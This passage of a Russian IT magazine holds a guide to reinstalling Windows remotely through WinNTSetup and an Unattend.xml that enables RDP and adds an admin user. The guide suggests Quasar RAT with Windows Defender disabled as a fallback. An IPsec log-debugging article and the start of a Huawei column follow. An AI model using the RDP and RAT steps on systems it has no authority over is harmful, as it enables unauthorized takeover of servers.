ничего не нужно. Файл может иметь немного дру гие имена, но спутать его
не с чем — размер перевалива ет за гигабайт и занимает большую часть
образа. Форматы WIM и ESD — это просто разные версии формата. Под‐
робнее об этом безоб разии уже написа но в «Хакере».
  К удаленному соединению особых требований не предъявля ется — оно
должно только поддерживать гра фику, то есть  Telnet и ему подоб ные
пережитки прошлого тут не годятся. И конечно, на целевой машине должны
быть доступны права администра тора. Хотя даже в 2020 году юзеры так и не
научились пользоваться компом без прав админа, так что по этому поводу
особо не волнуйся.
   Как ты понял, суть это го метода в том, что мы не выходим из установ‐
ленной системы  вплоть до перезагрузки  в уже  установленную новую.
Это может быть единственным вариантом в случае переустановки сис темы
на VPS, когда физически прийти и переуста новить попросту невозможно,
а потеря удаленного дос тупа приведет к потере самого сервера. Собствен‐
но, метод был придуман и реализован для переуста новки винды на сервере,
к панели которого был утрачен доступ.
  За основу была взята программа WinNTSetup 4. Ее задача — развернуть
систему из образов WIM/ESD в обход штат ного уста новщика и WinPE. Естес‐
твенно, программа умеет не только при менять образ, но и твикать устанав‐
ливаемую систему и имеет множес тво нас троек. В общем, для нормального
сисадмина или «тыжпрограммиста» эта ути лита обя зательна к скачиванию.





                  Главное окно программы WinNTSetup

При первом запуске тебе предложат скачать компоненты Windows ADK,
без которых программа не будет работать. Они занимают совсем немного
места, но, к сожале нию, в комплекте с программой не пос тавляются. Просто
имей это в виду.





Еще нам потребуется Bootice — крайне полезная программа для работы
с загрузчиками, которая, среди прочего, поддерживает редактирование BCD
(Boot Conﬁguration Data). Нам она понадобится, чтобы заставить загрузчик
винды грузить нашу свежеустановленную систему вместо сущес твующей.





                                 Bootice

Нам важно не потерять удален ный доступ пос ле переустановки, ведь новую
систему надо еще настроить. Пос кольку изна чаль но процедура нужна была
на VPS, в качестве удаленного доступа использовался RDP, под который я
и делал этот метод. Если ты используешь дру гое средство, я расскажу,
как быть с ним, позже. В случае же с RDP сохранение доступа обеспечива‐
ется редактированием реестра пос ле установки, пусть и автомати ческим.


           WARNING

                 Любое вмешательство в загрузочный код, в том
                       числе переустановка ОС (а особенно переуста‐
                       новка нештатным способом), может привести
                          к труд но восстановимому «кирпичу». Все описан‐
                      ное делай, только когда создашь копию данных
                      или если умеешь их восстанавливать!



СНЕСТИ И НАКАТИТЬ
Теперь, когда весь софт ска чан и подготовка завершена, подключайся к кли‐
енту и приступай!


Разметка диска
Перво‐наперво нужно выделить место под новую ОС. На раз дел с сущес тву‐
ющей, как бы ни хотелось, уста новить не получится. Поэтому открывай дис‐
петчер дисков и создавай новый раздел в NTFS. По размеру меньше 10 Гбайт
ставить не следует.





Теперь, когда мы создали новый раз дел (я создал около 60 Гбайт), устанав‐
ливаем.


WinNTSetup
Открываем программу WinNTSetup, вспоминаем, какую версию Windows мы
будем ставить, выбираем соответс твующую вкладку вверху окна. Я искренне
верю, что ты не будешь ста вить ни Windows XP, ни Windows 2000, так что опи‐
сание установки для них опущу. Тем более что процесс не сильно отличается
и программа дает множество подска зок.
   Теперь  давай  раз беремся  с  наз начением  настроек  программы.
Для удобства размечу их цифрами.





 1. Эти две вкладки управляют версией устанавлива емой Windows. По умол‐
   чанию открыта вторая вкладка (на скрин шоте), которая позволяет установ‐
   ку всех современных версий винды. Первая вкладка имеет несколько дру‐
   гой набор твиков и воз можнос тей тонко настро ить систему перед установ‐
   кой.





 2. Тут нужно указать путь к файлу WIM/ESD с Windows. ISO не пойдет. Чтобы
   выйти из этой ситуации, можно извлечь нужный файл из ISO любым сов‐
  ременным архиватором либо смонтировать его UltraISO или DaemonTools.
   Кстати, если уже установленная ОС — Windows 10, смонтировать образ
   (правда, не всякий) мож но пря мо проводником Windows! Тогда ничего
   копировать не придется.
 3. Тут выбирается загрузочный диск. Не тот, на который установлена текущая
  ОС, а именно загрузоч ный. По умолчанию его не видно, но при запуске
   программа монтирует его на Z:, как на скриншоте. Там находится EFI‐заг‐
   рузчик и его обвязка, так что немытыми руками туда лучше не лезть. И на
  MBR‐, и на GPT‐дисках этот раз дел зовет ся «Зарезервировано системой»,
   но на EFI (GPT) он отформатирован в FAT32, а на BIOS (MBR) — в NTFS.
   Как видишь, для скрин шотов я использую два компьютера: основной
   на MBR (тут нор мальную поддержку UEFI, увы, не завезли) и тестовый
   на GPT. Короче, не обра щай внимания на раз ницу на скриншотах.
 4. Это, пожалуй, самое простое. Нужно только выб рать новосоз данный раз‐
   дел. Больше ничего тро гать не надо. На нем могут быть и другие файлы,
   установке это не помешает. Но лучше, конечно, ставить на чис тый диск.
 5. В этом списке появятся редакции системы, которые можно установить.
   Как ты помнишь, в одном ISO могут лежать несколько редакций Windows:
   к примеру, Enterprise и Pro; а еще они могут быть разной разряднос ти.
   WinNTSetup позволяет выбрать устанавлива емую редакцию, если их боль‐
  ше одной. Еще один плюсик к удобству! :)
 6. Тут у нас сразу две близ кие по назначению настройки. Unattend позволя‐
   ет задать кастомный Unattend.xml для установки. Мы будем исполь‐
   зовать эту функцию для сохранения уда лен ного доступа. Add  drivers
   позволяет интегрировать драйверы в устанавливаемую систему. Если
   у тебя есть диск со специальными драйверами для оборудования клиента,
   их можно установить сразу же, не дожида ясь перезагрузки.
 7. Эта функция позволяет переназ начить букву сис темного дис ка в новой
   Windows. Если даже ты ста вишь систему на диск D:, как я в рамках демо, то
   эта функция прикажет смонтировать раз дел как диск C: (или любой дру‐
   гой) в новой системе.
 8. Последние три функции управляют режимом установки и твиками новой
   системы.

Сперва рассмотрим Mode: он поз воляет включить сжатие Compact OS (даже
несколькими способами!) или оста вить ста рый доб рый WIMBOOT. На сов‐
ременных SSD опция не сильно вос требованная, но на моделях постарше
еще актуальная. Она поз воляет неиллюзорно сэкономить место на накопи‐
теле, а еще несколь ко уско рить заг рузку.
   Кнопка Tweaks открывает широкие воз можнос ти для модификации новой
системы, в том числе отключение ненужных компонентов Windows, вроде Win‐
dows Defender и гибернации, мощный тюнинг проводника и реестра. Если
тебе чего‐то не хватило — можно дописать самостоятельно.





                       Дос тупные твики

VHD поможет установить Windows на вир туальный диск VHD или VHDX,
который затем можно использовать в средах виртуализации или для соз‐
дания готового к развертыванию обра за с уже уста новленной ОС. Лично мне
эта функция так и не пригодилась, но сказать я о ней должен был.





Теперь, когда функции программы понятны, можно приступать к собс твенно
установке. Монтируй ISO (или дру гим способом дос тавай из него установоч‐
ный WIM/ESD), загоняй его в программу, выбирай разделы, редакцию сис‐
темы и твики (их я подробно рассмат ривать не буду — названия впол не точно
передают назначение).


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ

        КОГДА ВИНДА
          НЕ ВИДНА
              ПЕРЕУСТАНАВЛИВАЕМ WINDOWS ЧЕРЕЗ
                           УДАЛЕННЫЙ ДОСТУП





Сохранение доступа
Прежде чем ты нажмешь кнопку Setup, прошу вспомнить о необходимости
сохранить удаленный доступ к машине. Делать это мы будем с помощью фай‐
ла Unattend.xml. В нем, кро ме настроек, которые появляются на экране
при первом запуске, можно задать и команды, которые будут выполнены пос‐
ле установки. Этим мы и вос пользуемся: RDP‐сервер включается в реестре,
который можно редактировать с помощью командной строки. После выпол‐
нения команд из файла пос ледует перезагрузка, так что сервер точно вклю‐
чится.
  И еще один момент, который сто ит помнить: на реальном сервере обычно
не сразу «белый» адрес, а «серый» адрес, получаемый по DHCP от виртуаль‐
ного (или не очень) коммутатора, от которого нас троен проброс портов
на наш сервер. Если заблаговременно не была вклю чена доступность всех
портов из интернета, а настроенный RDP‐порт отличается от стандартного
(3389), то после переустановки и включения RDP мы не сможем под ключить‐
ся, ведь нужный порт не проб рошен. Так что перед пере установкой придется
посмотреть, на какой порт назначен RDP, и переписать его в Unattend.xml.


Что делать пользователям других средств удаленного
доступа
В общем случае — курить бамбук. Тот же TeamViewer не позволя ет автомати‐
чески установить клиент и войти в акка унт в нем. AnyDesk генери рует новый
идентификатор на новой системе, следова тельно, он тоже бесполезен.
  В качестве альтернативы можно использовать старый добрый Quasar RAT,
благо он бесплатный и на новой системе (если отклю чить Windows Defender)
никто ему мешать не будет. У тебя, конечно, есть свой сервер, так что пос‐
тавить на него админку Quasar и словить коннект от клиента будет не проб‐
лема.
  Нужно собрать через админку клиентский бинарник, который положить
в автозагрузку новой системы. Сделать это можно тысячей и одним спо‐
собом, так что выбирай удобный и делай. Затем, когда все манипуляции
в старой ОС будут завершены, ты перезаг рузишь компьютер, и будет запуще‐
на и настроена новая сис тема. В конце настройки выполнится наш скрипт. Он
установит клиент Quasar в систему, пос ле чего та будет еще раз перезаг‐
ружена, а ты словишь коннект. Далее через режим удаленного рабочего сто‐
ла можно продол жать настройку свежеустановленной Windows или можно
установить более удоб ный AnyDesk или TeamViewer и продол жить через них.
   Да, понимаю, это выглядит как кос тыль (которым, собственно, и явля ется),
но оно работает. Если у тебя есть способ получше — ты знаешь, где находят‐
ся комментарии.



Unattend.xml
Вообще, файл Unattend.xml я соз давал с помощью онлайнового сервиса
Windows AFG. Но генерируемый им файл содержит много мусора, так что его
я правил вручную.





         Оригинальный Unattend.xml, генерируемый сервисом

Из всех проходов (а они зада ются в контейнерах вида <settings pass="...
">) нас интересуют толь ко два пос ледних — specialize и oobeSystem.
Именно они задают поведение программы первичной нас тройки системы
и хранят ответы на вопросы, которые появляют ся при первом запуске.
Короче, удаляй строки с 13‐й по 164‐ю, они нам не понадобятся. Коммента‐
рий в начале файла тоже выкидывай — полезной нагрузки он не несет, только
рекламу делает.
  Напомню задачу: ответить на все вопросы при установке автоматически,
создать пользователя и добавить его в группу админис траторов и поль‐
зователей удаленного рабочего стола, включить и настроить RDP и увести
комп в перезагрузку.
  Ответы на вопросы у нас уже есть — спа сибо сервису генерации файлов.
Создание пользователя тоже есть, но оно почему‐то не позволя ет добавить
его в несколько групп разом. RDP включается и нас траивается из командной
строки, что тоже можно прописать в файл. Ну а перезагрузка выпол нится
автоматически после окончания обра ботки нашего файла.
  Давай внимательно рас смотрим про ход oobeSystem. Первым делом у нас
идет автовход поль зователя (подконтейнер component/AutoLogon). Даль‐
ше — отключение лишних вопросов при установке  (OOBE). После этого
начинается самое вкусное — создание пользователь ских аккаунтов, где пря‐
мым текстом указывается логин и пароль нового аккаунта, задается аккаунт
владельца устрой ства, а еще команды, которые должны быть выполнены
при установке. Их‐то мы и будем использовать.
  По умолчанию уже назначено три команды: нас трой ка типа отображения
панели управления, настройка раз мера значков и отключение протухания
пароля пользователя. Мы можем добавить и свои команды по образцу, но,
чтобы ты не путался, я приведу код, который нужно вставить пос ле существу‐
ющих команд.


<SynchronousCommand wcm:action="add">
    <Order> 4</Order>
    <CommandLine>reg add "HKEY_LOCAL_MACHINE\System\
CurrentControlSet\Control\Terminal Server\WinStations\RDP‐Tcp" /v
PortNumber /t REG_DWORD /d 0x00000d3d /f</CommandLine>
    <RequiresUserInput> false</RequiresUserInput>
    <Description>Set RDP port</Description>
</SynchronousCommand>
<SynchronousCommand wcm:action="add">
    <Order> 5</Order>
    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SYSTEM\
CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t
REG_DWORD /d 0 /f</CommandLine>
    <RequiresUserInput> false</RequiresUserInput>
    <Description>Enable RDP</Description>
</SynchronousCommand>
<SynchronousCommand wcm:action="add">
    <Order> 6</Order>
    <CommandLine>netsh advfirewall firewall set rule group="remote
desktop" new enable=Yes</CommandLine>
    <RequiresUserInput> false</RequiresUserInput>
    <Description>Enable RDP on firewall</Description>
</SynchronousCommand>
<SynchronousCommand wcm:action="add">
    <Order> 7</Order>
    <CommandLine>net localgroup "Remote Desktop Users" xakep_ru /add
</CommandLine>
    <RequiresUserInput> false</RequiresUserInput>
    <Description>Allow login via RDP</Description>
</SynchronousCommand>
<SynchronousCommand wcm:action="add">
    <Order> 8</Order>
    <CommandLine>shutdown ‐r ‐f ‐t 120</CommandLine>
    <RequiresUserInput> false</RequiresUserInput>
    <Description>Schedule a reboot</Description>
</SynchronousCommand>

В строке 2 мы видим параметр Order: он задает, какой по поряд ку выпол‐
нится команда. Номера не должны повторяться. Параметр CommandLine
и задает выполняемую команду. Остальное не особо важно.
  В первой команде мы задаем порт RDP перед включением. Значения
передаются только в шестнадцатеричной форме, так что не забудь исправить
это значение, если потребуется. По умол чанию я оставил 0x00000d3d —
3389 в десятичном виде. Вто рая команда вклю чает RDP, разрешая под клю‐
чение к заданному выше порту.
   Третьей командой мы явно разрешаем подключения к RDP на файрволе,
если ты по каким‐то причинам не вырезал его из сис темы при установке.
  Затем добавляем нашего нового пользователя (у меня xakep_ru) в группу
пользователей удаленного рабочего стола и последней командой планируем
перезагрузку через две минуты (120 секунд), если она не выпол нится самос‐
тоятельно.
  Важный момент: все нас тройки дуб лируются, то есть для 32‐ и 64‐раз‐
рядной Windows настрой ки могут быть разные! Внося изменения, не забудь
продублировать их в разделе с другой разрядностью, чтобы потом не крас‐
неть от стыда.


Установка
Теперь все, взводи галочку Unattend и устанавливай! Пос ле запуска прог‐
рамма еще раз запросит подтверждение уста новки. Вдруг ты случайно выб‐
рал правильные файлы и вообще ничего устанавливать не хочешь? Есть
еще время отказаться…





                       Программа за работой





                             Готово!

Как видишь, процесс весьма быс трый. Осталось только настроить загрузчик.


Другой способ
Как я позже вспомнил, можно не парить себе мозг с файлами ответов
и командной строкой, если доступна виртуализация. Можно пробросить
в виртуалку реальный диск, установить ОС на дру гой раздел и настроить ее
по своему вкусу прямо в виртуалке, что значитель но удобнее. В равной мере
это относится и к Linux‐based‐дистрибути вам. Жаль только, что на VPS
в подавляющем большинстве случаев вир туализация недоступна, так что опи‐
санный выше «кол хозный» метод забывать рано.



Bootice
Если при запросе об обновлении загрузочного кода ты отве тил, что хочешь
видеть в загрузоч ном меню все установленные версии Windows, то сейчас
будь особенно внимателен.
  Открывай Bootice, переходи на вкладку BCD, выбирай BCD of current sys‐
tem, жми Easy mode и удаляй ненужную заг рузочную запись. Оставшаяся дол‐
жна выглядеть как‐то похоже на скриншот.





Также желательно на системах с BIOS (MBR) проверить, чтобы в MBR был
прописан нужный загрузчик. Для полной уверенности его можно при нуди‐
тельно переписать загрузчиком винды. Делается это по нажатию Process
MBR в главном окне прог раммы (не забудь выб рать нужный диск!).





На этом этапе можно было бы спокойно перезаг рузиться и закончить статью,
но, если ты исполь зовал другое средство уда ленного доступа, для тебя все
только начинается… Впро чем, давай не будем о грус тном.


ЖИЗНЬ ПОСЛЕ WINDOWS
Если все прошло как надо, то пос ле некоторого ожидания в неведении ты
получишь рабочую машину с уда ленным доступом и новой ОС. Время ожи‐
дания всегда разное и сос тавляет от 3 до 15 минут, в зависи мости от задум‐
чивости железа целевой машины. Тут можно ска зать только одно — терпение.
В худшем случае компь ютер заг рузится обратно в старую систему и у тебя
будет шанс попробовать снова.





                       Ус пешная переустановка

После установки и загрузки можно нас траивать новую ОС, ставить софт,
драйверы… Тут не мне тебя учить.


ЗАКЛЮЧЕНИЕ
Я мог бы закончить целой лекцией о том, что этот метод недопустимо исполь‐
зовать для угона чужих серверов и вредительства, но я надеюсь, что ты и так
в курсе возможных последс твий. Так что исполь зуй эти знания с умом!
АДМИН

   ГАДАНИЕ
  ПО ЛОГАМ
     IPSEC

       НА ПРАКТИКЕ РАЗБИРАЕМ
           ПРОТОКОЛ IKE





IPsec задумывался как универсальный стек
протоколов  для  VPN,  после  которо го
никаких других уже не нужно. Само сущес‐         Даниил Батурин
твование OpenVPN, WireGuard и мно жества        (https://vyos.io),Координатор проекта«языковед»,VyOS
других протоколов доказывает, что достичь        функциональщик,сетевой администраториногда
                                                                                                         daniil@baturin.org
своей цели разработчикам IPsec не уда‐
лось.


Цена абсолютной универсальности и гиб кости — чрез мерная сложность про‐
токола, а значит, и сложность его нас трой ки и отладки. Кроме того, первая
версия IPsec разрабатывалась совсем в дру гое время, когда динамических
адресов, NAT и мобильных подключений не сущес твовало. Поменять архитек‐
туру протокола было уже невоз можно, поэтому он оброс рас ширениями
и стал еще сложнее.
   Казалось бы, можно прос то забыть его как страш ный сон и пользоваться
более удобными решениями вроде того же OpenVPN. Но не все так просто —
IPsec остается единственным общепризнанным стандартом и единс твенным
протоколом, который поддерживает сетевое оборудование всех произво‐
дителей.
  Сервисам VPN, призванным повысить при ватность, никто не диктует, что
использовать, посколь ку на их серверах и клиентах ОС общего назначения,
на которую можно поставить что угодно. В корпоративных сетях такой сво‐
боды выбора может и не быть. А уж если ты соединяешь две сети на оборудо‐
вании разных поставщиков, то выбора может не быть вообще — только IPsec.
  В общем, если ты занимаешься сетевым администрированием, избежать
работы с IPsec вряд ли получит ся, несмотря на всю его сложность и неудобс‐
тва. И если бы все ограничивалось сложностью самого протокола! Зачастую
«веселья» добавляют различия реализаций, разные умол чания в них и не
вполне адекватные админы на дру гой стороне, от которых не дождешься
никакой отладоч ной информа ции. В этом случае настройка и отладка тун‐
нелей превращается в гадание по логам.
  При этом логи IPsec зачас тую полны специфичной терминологии и легко
могут смутить новичка, еще незнакомого с про токолом в деталях. В этой
статье мы рассмотрим ряд воз можных ошибок нас трой ки и их проявле ния
в логах.
  В качестве примера мы возьмем strongSwan. Эта свободная реализация
IPsec (вернее, протокола IKE) весьма популярна и используется многими
дистрибутивами Linux и FreeBSD для сетевых устройств: OpenWRT, pfSense,
Sophos, VyOS и другими.


ОСНОВЫ
Протокол IPsec состоит из двух частей: протокола IKE (Internet Key Exchange)
и протоколов AH и ESP (Authentication Header и Encapsulated Security Payload).
  Протоколы AH и ESP отвечают за шифрование трафика и его аутентифика‐
цию с помощью встроенных в заголо вок пакета подписей, они реализованы
в ядре ОС или в аппарат ной час ти маршру тиза тора. Для их работы требуется
согласование параметров шифрования. Набор из селекторов трафика и нас‐
троек, который указывает ядру, какой тра фик и как шифровать, называется
security association (SA). Во многих системах их мож но настроить вручную.
Например, в Linux это делается командой ip xfrm. На практике этот метод поч‐
ти не используется из‐за тру доемкости.
  Для автоматизации обмена клю чами и согласова ния настроек применя‐
ется протокол IKE. Его реализация — это обычно процесс в пространстве
пользователя; сам по себе он никакой тра фик не шифрует, а прос то создает
security associations в ядре (в Linux — по протоколу netlink). Именно IKE обыч‐
но настраивают сетевые администраторы, и именно на этапе согласования
параметров туннеля всплывают все ошиб ки и несовместимости в настройках.


ПРАКТИКА
Итак, давай развернем небольшой тестовый полигон, а потом разберемся
непосредственно с логами.


Поднимаем туннель
Прежде всего нам понадобятся две машины с установленным strongSwan
версии 5.2 или выше. Назовем их east и west. Прис воим им условные адре‐
са 192.0.2.10 и 203.0.113.10.


             INFO

                       Условные публичные адреса правильнее всего
                        брать из сетей, специально зарезервированных
                       для примеров и докумен тации в RFC 5737:
                  •192.0.2.0/24
                  •198.51.100.0/24
                  •203.0.113.0/24





                          То поло гия сети

Для простоты мы ограничимся ста тичес ким общим ключом (pre‐shared key),
хотя strongSwan поддерживает и ключи RSA, и сертификаты x.509.
  Сначала создадим /etc/ipsec.conf и /etc/ipsec.secrets для east.


config setup


conn tunnel ‐west
  left =192 .0 .2 .10
  right =203 .0 .113 .10
  leftsubnet =10.20.30.0 /24
  rightsubnet =10.40.50.0 /24
  leftsubnet =10.20.30.0 /24
  ike =aes128 ‐sha1 ‐modp2048 !
  keyexchange =ikev2
  reauth =no
  ikelifetime =28800s
  closeaction =none
  esp =aes128 ‐sha1 !
  keylife=3600s
  rekeymargin =540s
  type =tunnel
  compress =no
  authby =secret
  auto =start
  keyingtries =%forever


192 .0 .2 .10 203 .0 .113 .10 : PSK "qwerty"

Теперь создадим /etc/ipsec.conf и /etc/ipsec.secrets для west.


config setup


conn tunnel ‐east
  left =203 .0 .113 .10
  right =192 .0 .2 .10
  leftsubnet =10.40.50.0 /24
  rightsubnet =10.20.30.0 /24
  leftsubnet =10.40.50.0 /24
  ike =aes128 ‐sha1 ‐modp2048 !
  keyexchange =ikev2
  reauth =no
  ikelifetime =28800s
  closeaction =none
  esp =aes128 ‐sha1 !
  keylife=3600s
  rekeymargin =540s
  type =tunnel
  compress =no
  authby =secret
  auto =route
  keyingtries =1


203 .0 .113 .10 192 .0 .2 .10 : PSK "qwerty"

Проверить состояния туннелей можно командой sudo  ipsec  statusall.
Если ты нигде не ошибся, ты увидишь там что‐то вроде такого:



  Security Associations (1 up, 0 connecting):
  tunnel‐west[5]: ESTABLISHED 65 minutes ago, 192.0.2.10[192.0.2.10]...
  203.0.113.10[203.0.113.10]
  tunnel‐west[5]: IKEv2 SPIs: 625b6b882998fc83_i* edc6c365bf5aaabc_r,
  rekeying in 6 hours
  tunnel‐west[5]: IKE proposal: AES_CBC_128/HMAC_SHA1_96/PRF_HMAC_SHA1/
  MODP_2048



             INFO

                    Погасить или поднять тун нель вручную можно
                      коман дами вида sudo ipsec up/down tun‐
                   nel‐west.



Включаем отладочные сообщения
По умолчанию strongSwan не показывает в логах никаких деталей происхо‐
дящего. Это решение авторов в чем‐то можно понять — если все работает,
детальная запись диалога IKE будет просто ненуж ным шумом.
   Если у тебя есть возможность пра вить файлы настроек, то выбор опций
там весьма широк. Применить изменения без перезапус ка демона можно
командой swanctl  ‐‐reload‐settings либо отправкой сигнала SIGHUP
процессу charon.
   Увы, в спе циализиро ванных сетевых дистрибутивах этой возможности
может и не быть — они бывают весьма чувс твительны к попыткам что‐то сде‐
лать в обход их интерфейса. Но не все потеря но! Если у тебя есть доступ
по SSH, уровень детализации логов у работа ющего демона можно поменять
командой sudo ipsec stroke loglevel ike 3.
   Уровни детализации бывают от ‐1 (не писать ничего) до 4 (выводить все,
вплоть до секретных ключей). Уровень 3 вклю чает вывод дампов пакетов,
но не запись в логи секретной информации — оптимально для наших целей.


             INFO

                   В IKE, увы, не предусмотрен механизм отправ ки
                        детальных  отчетов об ошибках — инициатору
                     обычно придет просто no proposal chosen. Поэто‐
                     му включать отладочные сообщения и смот реть
                        их нужно на принимающей сто роне. Если ты
                     вынужден  отлаживать  неработающий  туннель,
                      переведи  свой  маршрутизатор  в  пассивный
                      режим, в strongSwan — опцией auto=route.



Несовместимые версии IKE
Нужно помнить, что существу ют две вер сии IKE: старая IKEv1 и новая IKEv2.
Вторая версия протокола реша ет очень много проблем первой: определение
и настройка NAT traversal в большинс тве случаев просто работает, в одном
туннеле можно совместить несколько локальных и удаленных сетей, а пол‐
ноценный механизм keepalive наконец позволил обеим сторонам видеть, что
туннель все еще жив.
  Однако IKEv1 и IKEv2, по сути, разные и не вполне совместимые протоко‐
лы. До версии 5.0 в strongSwan за них даже отвечали раз ные демоны (pluto
и charon). В новых версиях вся функциональность объ единена в charon,
но различий между протоколами меньше не стало, и автоматический даун‐
грейд с IKEv2 на IKEv1 все так же невозможен.
  В strongSwan вер сия протокола ука зывается опцией keyexchange. Про‐
пишем в конфиг стороны east опцию keyexchange=ikev1, перезапус тим тун‐
нель и посмотрим, что будет. На east мы получим то самое весьма рас плыв‐
чатое сообщение no proposal chosen независимо от детализации логов.



  rtr‐east charon[13411]: 06[NET] sending packet: from 192.0.2.10[500] to
  203.0.113.10[500] (336 bytes)
  rtr‐east charon[13411]: 08[NET] received packet: from 203.0.113.10[500]
  to 192.0.2.10[500] (36 bytes)
  rtr‐east charon[13411]: 08[ENC] parsed IKE_SA_INIT response 0 [ N(
  NO_PROP) ]
  rtr‐east charon[13411]: 08[IKE] received NO_PROPOSAL_CHOSEN notify error
  rtr‐east charon[13411]: 08[IKE] IKE_SA tunnel‐west[2] state change: CON‐
  NECTING => DESTROYING


На второй стороне в этом случае можно уви деть сообщение no IKE conﬁg
found.



  rtr‐west charon[14183]: 14[IKE] no IKE config found for 203.0.113.10...
  192.0.2.10, sending NO_PROPOSAL_CHOSEN


Решение: сообщить админу вто рой стороны свою версию IKE и попросить
удостовериться в ее совпадении.


Неверный ключ
Если в твоих настрой ках адреса маршру тиза торов прописаны явно, сооб‐
щение будет вида MAC mismatched. Здесь MAC озна чает Message Authentica‐
tion Code.



  rtr‐east charon[13411]: 16[IKE] tried 1 shared key for '192.0.2.10' ‐
  '203.0.113.10', but MAC mismatched



Несовместимые опции шифрования и PFS
PFS (Perfect Forward Secrecy) — это механизм обеспечения дол говременной
криптостойкости. Суть его в том, что на основе общего ключа вычисляется
временный сессионный ключ. Сам по себе общий ключ никогда не исполь‐
зуется напрямую: при уста новке соединения сразу генерируется временный
ключ, который затем меня ется по расписанию или при разрыве соединения.
Таким образом, даже если злоумышленники подберут ключ, они получат толь‐
ко доступ к трафику текущей сес сии. Ког да время дей ствия ключа истечет, им
придется подбирать его заново, что непрактично.
  Сессионный ключ вычисляется с помощью алгоритма Диффи — Хел лмана
(DH), классического или на основе эллиптических кривых.
  Подход к настрой ке PFS в сетевых устройствах бывает самым разным.
В некоторых системах можно встретить нас тройку вроде PFS enable/disable,
что так же бессмысленно, как опция «включить шифрование». Не бывает
«просто» шифрования, быва ет конкретный шифр и конкретный режим его
работы, например AES‐128‐CBC. Не бывает и «прос то» алгоритма выработки
сессионных ключей.
  На практике опция «включить PFS», как пра вило, подразумевает протокол
DH group 2 (modp1024). Кстати, он уже считает ся устаревшим и небезопас‐
ным. Бывают и другие варианты, так что нуж но уточнять в документации.
Но можно это увидеть и в логах.
  При высоких уровнях детализации strongSwan покажет тебе received pro‐
posals (что предлагает инициатор) и conﬁgured proposals (что настроено
на твоей стороне).
  Для эксперимента поменя ем в конфиге west опцию esp=aes128‐sha1!
на esp=aes‐128‐sha1‐modp2048! и уви дим в логах следующее.



  rtr‐west charon[14183]: 08[CFG] received proposals: ESP:AES_CBC_128/
  HMAC_SHA1_96/MODP_2048/NO_EXT_SEQ
  rtr‐west charon[14183]: 08[CFG] configured proposals: ESP:AES_CBC_128/
  HMAC_SHA1_96/NO_EXT_SEQ
  rtr‐west charon[14183]: 08[IKE] no acceptable proposal found


Порядок следования опций: шифр, хеш, PFS. Здесь мы видим, что шифр
(AES‐128) и хеш (SHA‐1) совпадают, вся разница в опции MODP_2048: она
есть в received proposals, но отсутс твует в conﬁgured. Все опции с префик‐
сами MODP и ECP — это названия групп для протокола DH. Соответс твие
номеров групп и обоз начений MODP/ECP можно найти в документации
к strongSwan.
  Несовместимость шифра и хеша встречается реже, поскольку во всех сис‐
темах их надо указывать явно — забыть их ука зать невозможно. Но теперь ты
уже знаешь, куда смотреть. Формат опции шифра: $name_$mode_$keyLength.
В нашем примере выше указан AES в режиме CBC с длиной ключа 128 бит.


Туннель «жив», а трафик не идет
Бывает и такое, и не так редко — особенно с IKEv1. По данным из вывода
sudo ipsec statusall вроде все в норме, но трафик уходит и не возвра‐
щается. Дело в том, что в IKEv1 нет обязательного механизма двустороннего
обмена пакетами keepalive. Таким обра зом, в промежутках между истечением
времени жизни клю ча процесс IKE никак не контролирует происходящее
и реализация AH/ESP (то есть ядро ОС или аппа ратный криптопроцессор)
предоставлены сами себе. Пакеты будут шифроваться и отправляться, даже
если на другой стороне никто не готов их принять.
  Для борьбы с этим предназна чены опции DPD (Dead Peer Detection).
Однако значения тайм‐аутов не входят в proposal и не согласуются между
сторонами, так что даже при включенном DPD одна сторона может считать
туннель живым куда доль ше другой — в пределе до истечения IKE timeout,
который может составлять много часов.
   Если у тебя возникла такая проблема, не забывай уточнить у адми на вто‐
рой стороны значения всех таймеров DPD. Но еще лучше сразу уговари вай
всех на IKEv2, где такие проблемы менее вероятны.


ЗАКЛЮЧЕНИЕ
Со стороны чтение логов IPsec может показать ся особым искусством.
Но если внимательно изучить детали работы протоко ла IKE, сообщения ста‐
новятся куда понятнее, а отладка — быс трее.
GEEK





     КОЛОНКА ЕВГЕНИЯ ЗОБНИНА
   БЛЕСК
  И НИЩЕТА
   HUAWEI





Для Huawei 2019 год стал едва ли не худ‐
шим годом за всю историю компании. Сво‐
ими недальновидными указами президент
США Дональд Трамп сделал так, что китай‐
ский  производитель  теперь  не  может          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
использовать в смартфо нах не только при‐              zobnin@glc.ru
ложения и сервисы компании Google, но и
собственные процессоры. И я не стал бы
заикаться об этом не очень инте ресном
событии, если бы не огромное количество
поклонников Huawei, внезапно про явив ших
преданность ком пании.


Вопреки всем ожиданиям люди продолжили покупать смартфоны любимой
марки и не побежали менять их после двух дней мучительного исполь‐
зования. Они оказались готовы замора чиваться с установкой сторонних при‐
ложений из непонятных источников, просиживать ночи за чтением ману алов
по нелегальной установке Play Store и искать аналоги извес тных приложений
в Huawei AppGallery. Любовь людей ока залась столь велика, что в этом году
компания не только не потеряла на про дажах телефо нов, но и укре пила свои
позиции, став самым популярным брендом в мире (да, Apple и Samsung оста‐
лись позади).
  Конечно же, ключевую роль в этой популярности сыграли покупатели
из Китая, которые не имели доступа к сервисам Google, а после появления
запретов пошли покупать хуавеи из прин ципа. Помогла и агрессивная рек‐
ламная кампания, захватившая все медиапространс тво, вплоть до Первого
канала и инстаграмов гламурных див. Но поговорить я бы хотел не о феноме‐
не Huawei и всей китайщины в целом, а о том, что же все‐таки получает тот
самый фанат компании Huawei, готовый мирить ся с отсутствием необ‐
ходимых приложений.
  Но сначала немного словоблудия.


БИЗНЕС ПО-КИТАЙСКИ
В последние несколько лет я плот но занимаюсь разработкой мобильных при‐
ложений для Android и поэто му всегда имею в своем арсенале пяток‐дру гой
телефонов разных произво дителей: Huawei, Xiaomi, Samsung, OnePlus и так
далее. Среди них есть телефон с прошивкой AOSP (чистый Android), которая
позволяет протестировать приложения  в, так сказать, эталонной среде.
В качестве бонуса я всег да могу посмотреть, как прошивки работают в срав‐
нении с «настоящим Android», таким, каким его задумала Google.
  И здесь начинается самое интерес ное. Android — это ОС с открытым
исходным кодом, поэтому у каждого производителя есть воз можность изме‐
нить любой из его ком понентов в любую сто рону. И большинс тво произво‐
дителей охотно этим поль зуются, тюнингуя внешний вид (то, что пользователи
некорректно называют сло вом «обо лочка») и поведение операционной сис‐
